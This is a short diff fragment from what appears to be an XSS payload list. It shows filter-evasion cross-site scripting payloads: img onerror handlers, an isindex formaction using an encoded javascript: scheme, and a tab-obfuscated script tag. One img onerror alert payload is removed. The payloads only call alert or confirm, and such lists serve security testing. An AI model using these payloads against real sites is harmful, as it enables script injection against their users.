@@ -11,7 +11,6 @@
 <img/src=`%00` onerror=this.onerror=confirm(1) 
 <form><isindex formaction="javascript&colon;confirm(1)"
 <script/&Tab; src='https://github.com' /&Tab;></script>
-<img src=`%00`&NewLine; onerror=alert(1)&NewLine;
 
 
 
